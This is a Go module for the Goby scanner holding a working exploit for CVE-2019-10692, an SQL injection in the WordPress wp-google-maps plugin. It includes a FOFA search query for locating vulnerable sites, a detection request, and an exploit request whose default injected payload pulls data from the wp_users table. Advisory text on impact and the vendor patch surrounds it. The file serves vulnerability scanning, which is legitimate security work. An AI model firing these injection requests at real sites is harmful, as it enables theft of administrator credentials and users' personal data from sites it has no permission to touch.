package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress wp-google-maps plugin SQL injection vulnerability (CVE-2019-10692)",
    "Description": "<p>The wp-google-maps plugin is a plugin that provides simple code to customize Google Maps quickly and easily.</p><p>An input validation error vulnerability exists in the includes/class.rest-api.php file in the WordPress wp-google-maps plugin version prior to 7.11.18. The vulnerability stems from the network system or product not properly validating the entered data.</p>",
    "Product": "wordpress-wp-google-maps",
    "Homepage": "https://wordpress.org/plugins/wp-google-maps/",
    "DisclosureDate": "2019-04-02",
    "Author": "sharecast",
    "FofaQuery": "body=\"/wp-content/plugins/wp-google-maps\"",
    "GobyQuery": "body=\"/wp-content/plugins/wp-google-maps\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://wordpress.org/plugins/wp-google-maps/#developers\">https://wordpress.org/plugins/wp-google-maps/#developers</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/475404ce-2a1a-4d15-bf02-df0ea2afdaea"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "createSelect",
            "value": "user(),%2a%20from%20wp_users",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/?rest_route=/wpgmza/v1/markers&filter={}&fields=md5(0x5c)--%20-",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "28d397e87306b8631f3ed80d858d35f0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/?rest_route=/wpgmza/v1/markers&filter={}&fields={{{sql}}}--%20-",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2019-10692"
    ],
    "CNNVD": [
        "CNNVD-201904-101"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress wp-google-maps 插件SQL注入漏洞 (CVE-2019-10692)",
            "Product": "wordpress-wp-google-maps",
            "Description": "<p>wp-google-maps 插件是一款提供的简单代码可以快速轻松地将自定义谷歌地图的插件。<br></p><p>WordPress wp-google-maps插件7.11.18之前版本中的includes/class.rest-api.php文件存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p><a href=\"https://wordpress.org/plugins/wp-google-maps/#developers\">https://wordpress.org/plugins/wp-google-maps/#developers</a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress wp-google-maps plugin SQL injection vulnerability (CVE-2019-10692)",
            "Product": "wordpress-wp-google-maps",
            "Description": "<p>The wp-google-maps plugin is a plugin that provides simple code to customize Google Maps quickly and easily.</p><p>An input validation error vulnerability exists in the includes/class.rest-api.php file in the WordPress wp-google-maps plugin version prior to 7.11.18. The vulnerability stems from the network system or product not properly validating the entered data.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://wordpress.org/plugins/wp-google-maps/#developers\">https://wordpress.org/plugins/wp-google-maps/#developers</a></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10697"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}